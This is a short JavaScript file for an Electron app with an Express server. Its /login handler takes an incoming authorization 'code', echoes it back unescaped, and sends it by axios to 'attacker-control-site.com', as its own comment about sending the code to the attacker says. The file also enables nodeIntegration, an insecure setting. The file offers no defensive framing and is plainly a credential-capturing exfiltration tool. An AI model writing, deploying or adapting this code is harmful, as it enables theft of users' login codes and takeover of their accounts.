const { app, BrowserWindow, ipcMain } = require('electron');
const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const port = 80; // You can change this to any port you prefer

// Create an Express app
const appServer = express();
appServer.use(bodyParser.urlencoded({ extended: true }));

// Handle GET request to /login
appServer.get('/login', (req, res) => {
  const code = req.query.code;
  res.send(`Received code: ${code}`);

  // Send the code to attacker.com
  axios.get(`http://attacker-control-site.com/receive-code?code=${code}`)
    .then(response => {
      console.log('Code sent successfully:', response.data);
    })
    .catch(error => {
      console.error('Error sending code:', error);
    });
});

// Start the Express server
appServer.listen(port, () => {
  console.log(`Server is listening on port ${port}`);
});

// Create the main Electron window
let mainWindow;

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      nodeIntegration: true
    }
  });

  mainWindow.loadFile('index.html');
}

app.on('ready', createWindow);

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('activate', () => {
  if (mainWindow === null) {
    createWindow();
  }
});
